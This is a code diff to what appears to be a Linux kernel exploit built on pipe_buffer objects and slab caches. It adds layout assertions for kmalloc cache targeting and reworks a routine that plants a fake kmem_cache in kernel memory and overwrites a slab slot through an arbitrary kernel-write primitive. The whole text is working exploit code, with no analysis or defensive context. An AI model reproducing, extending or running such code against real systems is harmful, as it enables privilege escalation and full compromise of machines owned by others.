@@ -133,6 +133,21 @@ _Static_assert(offsetof(struct oss_pipe_buffer, page) ==
 _Static_assert(offsetof(struct oss_pipe_buffer, ops) ==
                    TARGET_PIPE_BUFFER_OPS_OFF,
                "pipe_buffer.ops layout");
+_Static_assert(TARGET_KMALLOC_CACHE_SLOTS ==
+                   TARGET_KMALLOC_TYPES * TARGET_KMALLOC_BUCKETS,
+               "kmalloc_caches dimensions");
+_Static_assert(TARGET_KMALLOC_NORMAL_2K_SLOT / TARGET_KMALLOC_BUCKETS ==
+                   TARGET_KMALLOC_NORMAL_TYPE,
+               "normal kmalloc row");
+_Static_assert(TARGET_KMALLOC_CGROUP_2K_SLOT / TARGET_KMALLOC_BUCKETS ==
+                   TARGET_KMALLOC_CGROUP_TYPE,
+               "cgroup kmalloc row");
+_Static_assert(TARGET_KMALLOC_NORMAL_2K_SLOT % TARGET_KMALLOC_BUCKETS ==
+                   TARGET_KMALLOC_CGROUP_2K_SLOT % TARGET_KMALLOC_BUCKETS,
+               "kmalloc-2k column");
+_Static_assert((1ULL << (TARGET_KMALLOC_NORMAL_2K_SLOT %
+                         TARGET_KMALLOC_BUCKETS)) == TARGET_PIPE_OBJECT_SIZE,
+               "pipe allocation kmalloc class");
 
 static pthread_once_t g_init_once = PTHREAD_ONCE_INIT;
 static atomic_int g_prepare_request;
@@ -873,10 +888,10 @@ static int slab_cache_guard_begin(int fd, uint64_t object,
                                   uint32_t cache_size,
                                   struct slab_cache_guard *guard) {
   memset(guard, 0, sizeof(*guard));
-  if (!is_direct_ptr(object) || !write_fake_kmem_cache(fd, cache_size)) {
+  if (!is_direct_ptr(object)) {
     fprintf(stderr,
-            "[pipe_rw] guard: setup failed object=%016llx size=%u direct=%d\n",
-            (unsigned long long)object, cache_size, is_direct_ptr(object));
+            "[pipe_rw] guard: setup failed object=%016llx size=%u direct=0\n",
+            (unsigned long long)object, cache_size);
     return 0;
   }
   uint64_t page = direct_to_page(object);
@@ -904,6 +919,18 @@ static int slab_cache_guard_begin(int fd, uint64_t object,
     return 0;
   }
   uint64_t fake = g_payload_base + TARGET_FAKE_KMEM_CACHE_LIVE_OFF;
+  if (!oss_kernel_write_plan_supported(fake, TARGET_KMEM_CACHE_DESC_SIZE) ||
+      !oss_kernel_write_plan_supported(guard->slot, sizeof(uint64_t))) {
+    fprintf(stderr,
+            "[pipe_rw] guard: write plan rejected object=%016llx slot=%016llx "
+            "fake=%016llx errno=%d\n",
+            (unsigned long long)object, (unsigned long long)guard->slot,
+            (unsigned long long)fake, errno);
+    return 0;
+  }
+  if (!write_fake_kmem_cache(fd, cache_size)) {
+    return 0;
+  }
   if (!oss_kernel_write64(fd, guard->slot, fake)) {
     int saved_errno = errno;
     int restored = oss_kernel_write64(fd, guard->slot, guard->original);
